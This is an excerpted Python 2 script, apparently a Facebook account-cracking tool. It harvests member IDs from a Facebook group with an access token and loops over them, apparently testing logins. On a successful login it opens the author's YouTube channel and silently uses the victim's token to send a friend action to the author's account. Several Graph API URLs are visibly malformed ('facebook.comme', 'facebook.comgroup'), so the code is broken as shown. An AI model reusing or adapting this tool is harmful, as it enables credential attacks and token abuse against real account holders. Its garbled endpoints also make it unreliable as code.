	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				os.system('xdg-open https://www.youtube.com/channel/UCQCqVzrHbvFSFnKAu6bIQwg')
				requests.post('https://www.facebook.comme/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
...
def menu():
	...
	try:
		...
		login()
	try:
		otw = requests.get('https://www.facebook.comme?access_token='+toket)
...
def pilih_crack():
	...
	if peak =="":
		...
		try:
			r=requests.get('https://www.facebook.comgroup/?id='+idg+'&access_token='+toket)
		...
		re=requests.get('https://www.facebook.com'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
	...
	def main(arg):
		...
		try:													
			...
			if 'access_token' in q:
				x = requests.get("https://www.facebook.com"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
...
def clone_dari_member_group():
	...
	try:
		r=requests.get('https://www.facebook.comgroup/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mGroup not found"
	...
	teman = requests.get('https://www.facebook.com'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	...
	for w in kimak['data']:
		...
		id = w['id']
		nama = w['name']
		links = requests.get("https://www.facebook.com"+id+"?access_token="+toket)
